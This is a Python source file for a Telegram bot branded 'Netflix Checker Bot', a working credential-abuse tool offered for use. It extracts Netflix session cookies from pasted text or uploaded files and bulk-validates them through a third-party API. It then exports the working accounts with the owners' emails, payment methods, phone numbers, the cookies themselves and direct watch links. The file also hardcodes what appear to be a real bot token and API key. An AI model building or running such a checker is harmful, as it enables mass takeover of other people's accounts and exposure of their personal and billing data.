import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import logging
import time
import re
import sqlite3
import json
from datetime import datetime
from collections import defaultdict
import hashlib
import threading

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
TELEGRAM_BOT_TOKEN = "8715810433:AAFx-v1uNLsbiElBfOnfU_mIJwE7_qIgyZQ"
NFTOKEN_API_KEY = "NFK_00b4861d806da4a23c1aca87"
API_URL = "https://nftoken.site/v1/api.php"
DELAY_BETWEEN_REQUESTS = 1 # Seconds

# 👑 MULTI-ADMIN SYSTEM (Add your Telegram user IDs)
ADMINS = [
    8638647059,  # Replace with your Telegram ID
    6709531208,  # Add more admin IDs here
    # To find your ID, message @userinfobot on Telegram
]

# Database
DB_FILE = "netflix_bot.db"
# ==========================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ==========================================
# 💾 DATABASE SETUP
# ==========================================

def init_db():
    """Initialize SQLite database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        joined_date TEXT,
        total_checks INTEGER DEFAULT 0,
        live_found INTEGER DEFAULT 0,
        dead_found INTEGER DEFAULT 0,
        last_check TEXT
    )''')
    
    # Check history
    c.execute('''CREATE TABLE IF NOT EXISTS check_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        cookie_hash TEXT,
        status TEXT,
        email TEXT,
        plan TEXT,
        country TEXT,
        check_date TEXT
    )''')
    
    # Banned users
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY,
        banned_date TEXT,
        reason TEXT
    )''')
    
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name):
    """Add new user to database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date)
                 VALUES (?, ?, ?, ?)''', (user_id, username, first_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def is_banned(user_id):
    """Check if user is banned."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM banned_users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def update_user_stats(user_id, live=0, dead=0):
    """Update user statistics."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''UPDATE users 
                 SET total_checks = total_checks + ?, 
                     live_found = live_found + ?,
                     dead_found = dead_found + ?,
                     last_check = ?
                 WHERE user_id = ?''', (live + dead, live, dead, datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def save_check_result(user_id, cookie, status, data):
    """Save check result to history."""
    cookie_hash = hashlib.md5(cookie.encode()).hexdigest()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT INTO check_history (user_id, cookie_hash, status, email, plan, country, check_date)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (user_id, cookie_hash, status, 
               data.get("x_mail", "N/A"),
               data.get("x_tier", "N/A"),
               data.get("x_loc", "N/A"),
               datetime.now().isoformat()))
    conn.commit()
    conn.close()

def is_duplicate(user_id, cookie):
    """Check if cookie was already checked by this user."""
    cookie_hash = hashlib.md5(cookie.encode()).hexdigest()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''SELECT status, check_date FROM check_history 
                 WHERE user_id=? AND cookie_hash=? 
                 ORDER BY check_date DESC LIMIT 1''', (user_id, cookie_hash))
    result = c.fetchone()
    conn.close()
    return result

def get_user_stats(user_id):
    """Get user statistics."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result

def get_total_users():
    """Get total registered users."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    result = c.fetchone()[0]
    conn.close()
    return result

def get_all_users():
    """Get all user IDs."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    result = [row[0] for row in c.fetchall()]
    conn.close()
    return result

# Initialize database
init_db()

# ==========================================
# 🔧 HELPER FUNCTIONS
# ==========================================

def is_admin(user_id):
    """Check if user is admin."""
    return user_id in ADMINS

def extract_cookies_from_text(text):
    """Extract Netflix cookies from text, ignoring unnecessary lines."""
    cookies = []
    seen_hashes = set()
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        
        # Skip empty lines, comments, and headers
        if not line or line.startswith('#') or line.startswith('//'):
            continue
        
        # Skip common non-cookie lines
        skip_keywords = ['example', 'format:', 'note:', '---', '===', 'cookie file', 'total:', 'live:', 'dead:']
        if any(keyword in line.lower() for keyword in skip_keywords):
            continue
        
        # Look for Netflix-related content
        if 'netflix' in line.lower() or 'NetflixId' in line or '{' in line:
            # Clean prefixes
            cleaned = re.sub(r'^(cookie|account|netflix|data|live|dead):\s*', '', line, flags=re.IGNORECASE)
            cleaned = cleaned.strip(' -•*|')
            
            # Validate
            if cleaned and ('{' in cleaned or 'NetflixId' in cleaned):
                # Check for duplicates in current batch
                cookie_hash = hashlib.md5(cleaned.encode()).hexdigest()
                if cookie_hash not in seen_hashes:
                    seen_hashes.add(cookie_hash)
                    cookies.append(cleaned)
    
    return cookies

def check_single_cookie(cookie):
    """Check a single cookie via API."""
    payload = {"key": NFTOKEN_API_KEY, "cookie": cookie}
    
    try:
        response = requests.post(API_URL, json=payload, timeout=20)
        data = response.json()
        return (cookie, data, data.get("status") == "SUCCESS")
    except Exception as e:
        logger.error(f"API Error: {str(e)}")
        return (cookie, {"error": str(e)}, False)

def format_live_account(data):
    """Format live account details."""
    email = data.get("x_mail", "N/A")
    plan = data.get("x_tier", "Unknown")
    country = data.get("x_loc", "N/A")
    renewal = data.get("x_ren", "N/A")
    since = data.get("x_mem", "N/A")
    payment = data.get("x_bil", "N/A")
    phone = data.get("x_tel", "N/A")
    profiles = data.get("x_usr", "N/A")
    
    return (
        "╔══════════════════════╗\n"
        "║  ✅ *LIVE ACCOUNT*   ║\n"
        "╚══════════════════════╝\n\n"
        f"📧 {email}\n\n"
        "╔══════════════════════════════╗\n"
        f"| 💳 Plan: *{plan}*\n"
        f"| 🌍 Country: *{country}*\n"
        f"| 🔄 Renewal: *{renewal}*\n"
        f"| 📅 Since: *{since}*\n"
        f"| 💰 Payment: *{payment}*\n"
        f"| 📱 Phone: *{phone}*\n"
        f"| 👥 Profiles: *{profiles}*\n"
        "╚══════════════════════════════╝\n"
    ), data

def create_watch_buttons(data):
    """Create watch link buttons."""
    markup = InlineKeyboardMarkup()
    buttons = []
    
    links = [
        (data.get("x_l1", ""), "💻 PC"),
        (data.get("x_l2", ""), "📱 Mobile"),
        (data.get("x_l3", ""), "📺 TV")
    ]
    
    for url, text in links:
        if url and url.startswith("http"):
            buttons.append(InlineKeyboardButton(text, url=url))
    
    if buttons:
        markup.row(*buttons)
        return markup
    return None

def export_results_to_file(results):
    """Export live results to text file."""
    content = "╔════════════════════════════════════════╗\n"
    content += "║     NETFLIX LIVE ACCOUNTS EXPORT       ║\n"
    content += "╚════════════════════════════════════════╝\n\n"
    content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    live_count = 0
    for cookie, data, success in results:
        if success:
            live_count += 1
            content += f"═══════ ACCOUNT #{live_count} ═══════\n"
            content += f"Email: {data.get('x_mail', 'N/A')}\n"
            content += f"Plan: {data.get('x_tier', 'Unknown')}\n"
            content += f"Country: {data.get('x_loc', 'N/A')}\n"
            content += f"Renewal: {data.get('x_ren', 'N/A')}\n"
            content += f"Payment: {data.get('x_bil', 'N/A')}\n"
            content += f"Phone: {data.get('x_tel', 'N/A')}\n"
            content += f"\nCookie: {cookie}\n"
            content += "\n" + "━" * 40 + "\n\n"
    
    content += f"\n📊 SUMMARY\n"
    content += f"Total Live Accounts: {live_count}\n"
    content += f"Total Checked: {len(results)}\n"
    
    return content, live_count

# ==========================================
# 🎯 COMMAND HANDLERS
# ==========================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    first_name = message.from_user.first_name or "User"
    
    # Check if banned
    if is_banned(user_id):
        bot.send_message(message.chat.id, "🚫 *You are banned from using this bot.*", parse_mode="Markdown")
        return
    
    # Add user to database
    add_user(user_id, username, first_name)
    logger.info(f"User {user_id} ({username}) started bot")
    
    admin_badge = " 👑" if is_admin(user_id) else ""
    
    welcome_text = (
        "╔═══════════════════════╗\n"
        "║  🎬 *NETFLIX CHECKER*   ║\n"
        "╚═══════════════════════╝\n\n"
        f"👋 *Welcome{admin_badge}!*\n\n"
        "✨ *What I can do:*\n"
        "├ ✅ Check single cookies\n"
        "├ 🔄 Mass check (unlimited)\n"
        "├ 📁 Process .txt files\n"
        "├ 💾 Export live results\n"
        "├ 🔍 Duplicate detection\n"
        "├ 📊 Your statistics\n"
        "└ ⚡ Smart extraction\n\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "📝 *Quick Start:*\n"
        "• Paste a cookie\n"
        "• Send multiple lines\n"
        "• Upload .txt file\n"
        "• /stats - View your stats\n"
    )
    
    if is_admin(user_id):
        welcome_text += "• /admin - Admin panel 👑\n"
    
    welcome_text += "\n🚀 *Ready to check!*"
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📖 Guide", callback_data="help"),
        InlineKeyboardButton("ℹ️ About", callback_data="about"),
        InlineKeyboardButton("📊 My Stats", callback_data="mystats"),
        InlineKeyboardButton("🔍 Check Now", callback_data="check")
    )
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        return
    
    stats = get_user_stats(user_id)
    
    if not stats:
        bot.send_message(message.chat.id, "❌ No statistics found. Start checking cookies!", parse_mode="Markdown")
        return
    
    _, username, first_name, joined_date, total_checks, live_found, dead_found, last_check = stats
    
    joined = datetime.fromisoformat(joined_date).strftime("%Y-%m-%d")
    last = datetime.fromisoformat(last_check).strftime("%Y-%m-%d %H:%M") if last_check else "Never"
    
    success_rate = round((live_found / total_checks * 100), 2) if total_checks > 0 else 0
    
    stats_text = (
        "╔═══════════════════════╗\n"
        "║   📊 *YOUR STATISTICS*  ║\n"
        "╚═══════════════════════╝\n\n"
        f"👤 *User:* `{first_name}`\n"
        f"📅 *Joined:* `{joined}`\n"
        f"🕐 *Last Check:* `{last}`\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 🔍 Total Checks: *{total_checks}*\n"
        f"┃ ✅ Live Found: *{live_found}*\n"
        f"┃ ❌ Dead Found: *{dead_found}*\n"
        f"┃ 📈 Success Rate: *{success_rate}%*\n"
        "┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Keep checking! 🚀"
    )
    
    bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    total_users = get_total_users()
    
    admin_text = (
        "╔═══════════════════════╗\n"
        "║   👑 *ADMIN PANEL*      ║\n"
        "╚═══════════════════════╝\n\n"
        f"📊 *Total Users:* `{total_users}`\n\n"
        "*Available Commands:*\n\n"
        "📢 `/broadcast <msg>` - Message all\n"
        "👥 `/users` - List all users\n"
        "🚫 `/ban <id>` - Ban user\n"
        "✅ `/unban <id>` - Unban user\n"
        "📊 `/botstats` - Full statistics\n\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔐 Admin privileges active"
    )
    
    bot.send_message(message.chat.id, admin_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    try:
        msg_text = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.send_message(message.chat.id, "❌ Usage: `/broadcast Your message here`", parse_mode="Markdown")
        return
    
    users = get_all_users()
    success = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, f"📢 Broadcasting to {len(users)} users...", parse_mode="Markdown")
    
    for uid in users:
        try:
            bot.send_message(uid, f"📢 *ANNOUNCEMENT*\n\n{msg_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)  # Avoid flood limits
        except:
            failed += 1
    
    bot.edit_message_text(
        f"✅ Broadcast complete!\n\n✅ Sent: {success}\n❌ Failed: {failed}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, total_checks FROM users ORDER BY total_checks DESC LIMIT 10")
    users = c.fetchall()
    conn.close()
    
    users_text = "╔═══════════════════════╗\n"
    users_text += "║  👥 *TOP USERS*         ║\n"
    users_text += "╚═══════════════════════╝\n\n"
    
    for idx, (uid, uname, fname, checks) in enumerate(users, 1):
        users_text += f"{idx}. `{fname}` (@{uname})\n"
        users_text += f"   ID: `{uid}` | Checks: *{checks}*\n\n"
    
    bot.send_message(message.chat.id, users_text, parse_mode="Markdown")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    try:
        target_id = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Usage: `/ban USER_ID`", parse_mode="Markdown")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO banned_users (user_id, banned_date, reason) VALUES (?, ?, ?)",
              (target_id, datetime.now().isoformat(), "Banned by admin"))
    conn.commit()
    conn.close()
    
    bot.send_message(message.chat.id, f"✅ User `{target_id}` has been banned.", parse_mode="Markdown")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    try:
        target_id = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Usage: `/unban USER_ID`", parse_mode="Markdown")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM banned_users WHERE user_id=?", (target_id,))
    conn.commit()
    conn.close()
    
    bot.send_message(message.chat.id, f"✅ User `{target_id}` has been unbanned.", parse_mode="Markdown")

@bot.message_handler(commands=['botstats'])
def bot_statistics(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "⛔ *Admin access only!*", parse_mode="Markdown")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT SUM(total_checks), SUM(live_found), SUM(dead_found) FROM users")
    total_checks, total_live, total_dead = c.fetchone()
    
    c.execute("SELECT COUNT(*) FROM banned_users")
    banned_count = c.fetchone()[0]
    
    conn.close()
    
    total_checks = total_checks or 0
    total_live = total_live or 0
    total_dead = total_dead or 0
    
    stats_text = (
        "╔═══════════════════════╗\n"
        "║  📊 *BOT STATISTICS*    ║\n"
        "╚═══════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 👥 Total Users: *{total_users}*\n"
        f"┃ 🚫 Banned: *{banned_count}*\n"
        f"┃ 🔍 Total Checks: *{total_checks}*\n"
        f"┃ ✅ Total Live: *{total_live}*\n"
        f"┃ ❌ Total Dead: *{total_dead}*\n"
        "┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"📈 *Success Rate:* {round((total_live/total_checks*100), 2) if total_checks > 0 else 0}%\n\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    
    bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    bot.answer_callback_query(call.id)
    user_id = call.from_user.id
    
    if call.data == "help":
        help_text = (
            "╔═══════════════════════╗\n"
            "║    📖 *USER GUIDE*      ║\n"
            "╚═══════════════════════╝\n\n"
            "*📌 Supported Formats:*\n\n"
            "1️⃣ *JSON:*\n"
            "`{\"NetflixId\":\"value\",...}`\n\n"
            "2️⃣ *Netscape:*\n"
            "`netflix.com NetflixId=value`\n\n"
            "*📌 Features:*\n\n"
            "🔍 *Single Check* - Paste & send\n"
            "🔄 *Mass Check* - Multiple lines\n"
            "📁 *File Upload* - .txt files\n"
            "💾 *Auto Export* - Download results\n"
            "🔍 *Dupe Detection* - Skip repeats\n"
            "📊 *Statistics* - Track progress\n\n"
            "*📌 Commands:*\n"
            "/stats - Your statistics\n"
            "/start - Restart bot\n\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "💡 Files auto-filter junk!"
        )
        bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")
    
    elif call.data == "about":
        about_text = (
            "╔═══════════════════════╗\n"
            "║     ℹ️ *ABOUT*          ║\n"
            "╚═══════════════════════╝\n\n"
            "🤖 *Netflix Checker Bot v3.0*\n\n"
            "*Premium Features:*\n"
            "├ ✅ Instant validation\n"
            "├ 📊 Detailed info\n"
            "├ 🔗 Direct watch links\n"
            "├ 📁 File processing\n"
            "├ 🔄 Unlimited bulk check\n"
            "├ 💾 Export results\n"
            "├ 🔍 Smart duplicate skip\n"
            "├ 📈 User statistics\n"
            "├ ⚡ Queue system\n"
            "└ 👑 Multi-admin panel\n\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ Powered by NFToken API\n"
            "🔒 100% Secure & Private"
        )
        bot.send_message(call.message.chat.id, about_text, parse_mode="Markdown")
    
    elif call.data == "mystats":
        # Show user stats
        show_stats(call.message)
    
    elif call.data == "check":
        bot.send_message(
            call.message.chat.id,
            "📝 *Send me your cookie(s):*\n\n"
            "• Single cookie\n"
            "• Multiple (one per line)\n"
            "• Upload .txt file\n\n"
            "🔍 Duplicate detection enabled!\n"
            "💾 Results auto-exported!",
            parse_mode="Markdown"
        )

# ==========================================
# 📁 FILE HANDLER
# ==========================================

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, "🚫 You are banned.", parse_mode="Markdown")
        return
    
    logger.info(f"File received from user {user_id}")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name
        
        if not file_name.lower().endswith('.txt'):
            bot.reply_to(message, "❌ Please upload a *.txt* file only!", parse_mode="Markdown")
            return
        
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        cookies = extract_cookies_from_text(content)
        
        if not cookies:
            bot.reply_to(
                message,
                "❌ *No valid cookies found!*\n\n"
                "Make sure the file contains\n"
                "Netflix cookies in JSON or\n"
                "Netscape format.",
                parse_mode="Markdown"
            )
            return
        
        process_text = (
            "╔═══════════════════════╗\n"
            "║  📁 *FILE PROCESSING*   ║\n"
            "╚═══════════════════════╝\n\n"
            f"📄 File: `{file_name}`\n"
            f"🔍 Extracted: *{len(cookies)}* cookies\n"
            f"🔄 Checking duplicates...\n\n"
            "⏳ Please wait...\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        status_msg = bot.reply_to(message, process_text, parse_mode="Markdown")
        
        # Check for duplicates
        unique_cookies = []
        duplicate_count = 0
        
        for cookie in cookies:
            dup = is_duplicate(user_id, cookie)
            if dup:
                duplicate_count += 1
            else:
                unique_cookies.append(cookie)
        
        if duplicate_count > 0:
            bot.send_message(
                message.chat.id,
                f"ℹ️ Skipped *{duplicate_count}* duplicate(s)\n"
                f"Checking *{len(unique_cookies)}* new cookies",
                parse_mode="Markdown"
            )
        
        if unique_cookies:
            process_mass_check(message, unique_cookies, status_msg)
        else:
            bot.edit_message_text(
                "ℹ️ All cookies were duplicates!\n"
                "Nothing new to check.",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        
    except Exception as e:
        logger.error(f"File processing error: {str(e)}")
        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode="Markdown")

# ==========================================
# 🔍 COOKIE CHECKER
# ==========================================

@bot.message_handler(func=lambda message: True)
def check_cookie(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, "🚫 You are banned.", parse_mode="Markdown")
        return
    
    logger.info(f"Message from user {user_id}")
    
    raw_text = message.text.strip()
    cookies = extract_cookies_from_text(raw_text)
    
    if not cookies:
        bot.reply_to(
            message,
            "╔═══════════════════════╗\n"
            "║   ❌ *INVALID INPUT*    ║\n"
            "╚═══════════════════════╝\n\n"
            "⚠️ No valid cookies found!\n\n"
            "Send:\n"
            "• Netflix cookie(s)\n"
            "• .txt file\n"
            "• /help for guide",
            parse_mode="Markdown"
        )
        return
    
    # Single cookie
    if len(cookies) == 1:
        status_msg = bot.reply_to(
            message,
            "╔═══════════════════════╗\n"
            "║  🔍 *CHECKING...*       ║\n"
            "╚═══════════════════════╝\n\n"
            "⏳ Validating cookie...\n"
            "━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        process_single_check(message, cookies[0], status_msg)
    
    # Mass check
    else:
        status_msg = bot.reply_to(
            message,
            "╔═══════════════════════╗\n"
            "║  🔄 *MASS CHECK MODE*   ║\n"
            "╚═══════════════════════╝\n\n"
            f"📝 Detected: *{len(cookies)}* cookies\n\n"
            "⏳ Starting queue...\n"
            "━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        process_mass_check(message, cookies, status_msg)

# ==========================================
# ⚙️ PROCESSING FUNCTIONS
# ==========================================

def process_single_check(message, cookie, status_msg):
    """Process single cookie."""
    user_id = message.from_user.id
    _, data, success = check_single_cookie(cookie)
    
    # Save to database
    save_check_result(user_id, cookie, "LIVE" if success else "DEAD", data)
    update_user_stats(user_id, live=1 if success else 0, dead=0 if success else 1)
    
    try:
        if success:
            result_text, account_data = format_live_account(data)
            result_text += "\n🎬 *Watch Now:* ⬇️"
            markup = create_watch_buttons(account_data)
            
            bot.edit_message_text(
                result_text,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode="Markdown",
                reply_markup=markup
            )
        else:
            error_msg = data.get("message", data.get("error", "Invalid cookie"))
            bot.edit_message_text(
                "╔═══════════════════════╗\n"
                "║   ❌ *DEAD ACCOUNT*     ║\n"
                "╚═══════════════════════╝\n\n"
                f"💀 {error_msg}\n\n"
                "This cookie is invalid.\n"
                "━━━━━━━━━━━━━━━━━━━",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Single check error: {str(e)}")

def process_mass_check(message, cookies, status_msg):
    """Process multiple cookies with queue system."""
    user_id = message.from_user.id
    results = []
    total = len(cookies)
    
    try:
        for idx, cookie in enumerate(cookies, 1):
            # Update progress
            progress = int(20 * idx / total)
            progress_bar = "█" * progress + "░" * (20 - progress)
            percentage = int(100 * idx / total)
            
            try:
                bot.edit_message_text(
                    "╔═══════════════════════╗\n"
                    "║  🔄 *QUEUE PROCESSING*  ║\n"
                    "╚═══════════════════════╝\n\n"
                    f"📊 Progress: *{idx}/{total}* ({percentage}%)\n\n"
                    f"{progress_bar}\n\n"
                    f"⏳ Checking cookie #{idx}...\n\n"
                    f"✅ Live: *{sum(1 for r in results if r[2])}*\n"
                    f"❌ Dead: *{len(results) - sum(1 for r in results if r[2])}*\n"
                    "━━━━━━━━━━━━━━━━━━━",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode="Markdown"
                )
            except:
                pass
            
            result = check_single_cookie(cookie)
            results.append(result)
            
            # Save each result
            _, data, success = result
            save_check_result(user_id, cookie, "LIVE" if success else "DEAD", data)
            
            if idx < total:
                time.sleep(DELAY_BETWEEN_REQUESTS)
        
        # Update user stats
        live_count = sum(1 for r in results if r[2])
        dead_count = total - live_count
        update_user_stats(user_id, live=live_count, dead=dead_count)
        
        # Export results
        if live_count > 0:
            export_content, exported_count = export_results_to_file(results)
            
            # Send export file
            export_filename = f"netflix_live_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            bot.send_document(
                message.chat.id,
                document=export_content.encode('utf-8'),
                visible_file_name=export_filename
            )
        
        # Summary
        success_rate = round((live_count / total * 100), 2) if total > 0 else 0
        
        summary = (
            "╔═══════════════════════╗\n"
            "║ ✅ *CHECK COMPLETE*     ║\n"
            "╚═══════════════════════╝\n\n"
            f"✅ *Live:* {live_count}\n"
            f"❌ *Dead:* {dead_count}\n"
            f"📝 *Total:* {total}\n"
            f"📈 *Success Rate:* {success_rate}%\n\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
        )
        
        if live_count > 0:
            summary += "💾 *Results exported above!*\n\n"
            summary += "*Live Accounts Preview:*\n\n"
            
            for _, data, success in results[:3]:
                if success:
                    email = data.get("x_mail", "N/A")
                    plan = data.get("x_tier", "Unknown")
                    summary += f"📧 `{email}`\n💳 {plan}\n\n"
            
            if live_count > 3:
                summary += f"_...and {live_count - 3} more in file!_\n\n"
        else:
            summary += "💀 No live accounts found.\n"
        
        summary += "━━━━━━━━━━━━━━━━━━━"
        
        bot.edit_message_text(
            summary,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode="Markdown"
        )
        
        # Send individual live accounts with buttons (max 5)
        for _, data, success in results[:5]:
            if success:
                result_text, account_data = format_live_account(data)
                result_text += "\n🎬 *Watch Now:* ⬇️"
                markup = create_watch_buttons(account_data)
                
                bot.send_message(
                    message.chat.id,
                    result_text,
                    parse_mode="Markdown",
                    reply_markup=markup
                )
                time.sleep(0.5)
        
    except Exception as e:
        logger.error(f"Mass check error: {str(e)}")
        bot.edit_message_text(
            f"❌ *Error:* `{str(e)}`\n\nProcessed: {len(results)}/{total}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode="Markdown"
        )

# ==========================================
# 🚀 START BOT
# ==========================================

if __name__ == "__main__":
    print("╔═════════════════════════════════════╗")
    print("║  🎬 NETFLIX CHECKER BOT v3.0 PRO    ║")
    print("╚═════════════════════════════════════╝")
    print("\n✨ FEATURES:")
    print("  ├ ✅ Single & mass checking")
    print("  ├ 📁 File upload (.txt)")
    print("  ├ 💾 Auto-export results")
    print("  ├ 🔍 Duplicate detection")
    print("  ├ 📊 User statistics")
    print("  ├ ⚡ Queue system")
    print("  ├ 👑 Multi-admin panel")
    print("  ├ 🚫 Ban system")
    print("  └ 📢 Broadcast messaging")
    print("\n👑 ADMINS:")
    for admin_id in ADMINS:
        print(f"  • {admin_id}")
    print("\n🟢 Bot is running...")
    print("⏹️  Press Ctrl+C to stop\n")
    
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by admin!")
    except Exception as e:
        logger.error(f"Bot crashed: {str(e)}")
